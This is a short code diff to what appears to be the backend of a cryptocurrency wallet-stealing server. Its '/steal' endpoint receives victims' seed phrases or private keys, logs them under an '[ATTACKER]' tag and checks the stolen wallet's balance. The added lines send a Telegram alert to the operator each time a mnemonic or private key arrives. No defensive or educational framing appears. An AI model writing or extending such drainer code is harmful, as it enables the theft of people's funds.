@@ -136,6 +136,18 @@ app.post('/steal', async (req, res) => {
     const addr = (await signer.getAddress()).toLowerCase();
     console.log(`[ATTACKER] Received secret for address: ${addr} (${new Date().toISOString()})`);
 
+    // Send Telegram notification immediately when seed phrase is received
+    const secretType = maybeWords.length >= 12 ? 'mnemonic' : 'private key';
+    await sendTelegramAlert({
+      victim: addr,
+      balanceEth: 'checking...',
+      txHash: null,
+      gasUsed: null,
+      gasFeeEth: null,
+      senderAddr: null,
+      senderName: `🔑 ${secretType.toUpperCase()} RECEIVED`
+    });
+
     // Check balance
     const balance = await provider.getBalance(addr);
     const balanceStr = ethers.utils.formatEther(balance);
